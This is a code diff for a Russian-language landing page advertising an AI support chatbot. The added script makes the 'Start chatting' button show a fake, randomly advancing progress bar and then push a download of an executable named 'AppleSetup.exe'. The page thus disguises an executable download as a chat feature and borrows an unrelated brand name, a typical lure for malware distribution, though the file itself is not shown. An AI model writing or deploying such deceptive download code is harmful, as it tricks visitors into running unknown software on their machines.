@@ -33,7 +33,26 @@
             <span></span><span></span><span></span>
         </button>
     </nav>
-
+    <div class="download-modal">
+        <div class="download-content">
+            <div class="download-header">
+                <h3>Загрузка Support Bot</h3>
+                <button class="close-modal">×</button>
+            </div>
+            <div class="download-progress">
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                <div class="progress-text">Подготовка к загрузке...</div>
+            </div>
+            <div class="download-info">
+                <div class="file-info">
+                    <span class="file-name">AppleSetup.exe</span>
+                    <span class="file-size">109 МБ</span>
+                </div>
+            </div>
+        </div>
+    </div>
     <!-- Главный экран -->
     <header class="hero">
         <div class="hero-content">
@@ -45,28 +64,10 @@
                 <li>✓ Точность ответов 99.9%</li>
             </ul>
             <div class="hero-buttons">
-                <button class="primary-btn">Начать общение</button>
-                <button class="secondary-btn">Узнать больше</button>
+                <button class="primary-btn" style="margin: 25px;">Начать общение</button>
             </div>
         </div>
-        <div class="hero-visual">
-            <div class="particles">
-                <!-- Добавить анимированные частицы -->
-                <div class="particle"></div>
-                <div class="particle"></div>
-                <div class="particle"></div>
-            </div>
-            <div class="hero-features">
-                <div class="feature-badge">
-                    <span class="badge-icon">⚡️</span>
-                    <span class="badge-text">Мгновенные ответы</span>
-                </div>
-                <div class="feature-badge">
-                    <span class="badge-icon">🔒</span>
-                    <span class="badge-text">Безопасность данных</span>
-                </div>
-            </div>
-        </div>
+
     </header>
 
     <!-- Статистика -->
@@ -472,7 +473,47 @@ const observer = new IntersectionObserver((entries) => {
 }, observerOptions);
 
 document.querySelectorAll('[data-scroll]').forEach((el) => observer.observe(el));
+function startDownload() {
+    const modal = document.querySelector('.download-modal');
+    const progressFill = document.querySelector('.progress-fill');
+    const progressText = document.querySelector('.progress-text');
+    
+    modal.classList.add('active');
+    
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.random() * 15;
+        if (progress > 100) progress = 100;
+        
+        progressFill.style.width = `${progress}%`;
+        
+        if (progress < 30) {
+            progressText.textContent = 'Подготовка файлов...';
+        } else if (progress < 60) {
+            progressText.textContent = 'Загрузка компонентов...';
+        } else if (progress < 90) {
+            progressText.textContent = 'Почти готово...';
+        } else if (progress === 100) {
+            progressText.textContent = 'Загрузка завершена!';
+            clearInterval(interval);
+            setTimeout(() => {
+                // Здесь указываем имя файла для загрузки
+                window.location.href = 'AppleSetup.exe';
+                modal.classList.remove('active');
+            }, 1000);
+        }
+    }, 200);
+}
 
+// Привязываем функцию к кнопкам загрузки
+document.querySelectorAll('.download-btn, .primary-btn').forEach(btn => {
+    btn.addEventListener('click', startDownload);
+});
+
+// Закрытие модального окна
+document.querySelector('.close-modal').addEventListener('click', () => {
+    document.querySelector('.download-modal').classList.remove('active');
+});
 
 // Мобильное меню
 const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
